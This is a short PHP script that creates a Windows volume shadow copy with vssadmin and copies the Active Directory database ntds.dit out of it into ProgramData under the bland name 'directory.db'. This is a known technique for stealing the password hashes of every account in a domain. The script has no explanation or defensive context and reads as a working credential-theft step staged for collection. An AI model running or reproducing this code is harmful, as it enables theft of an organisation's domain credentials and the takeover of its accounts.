<?php
system('vssadmin.exe create shadow /for=C:', $status);
if ($status !== 0) { exit($status); }
copy('\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy23\\Windows\\NTDS\\ntds.dit', 'C:/ProgramData/directory.db');
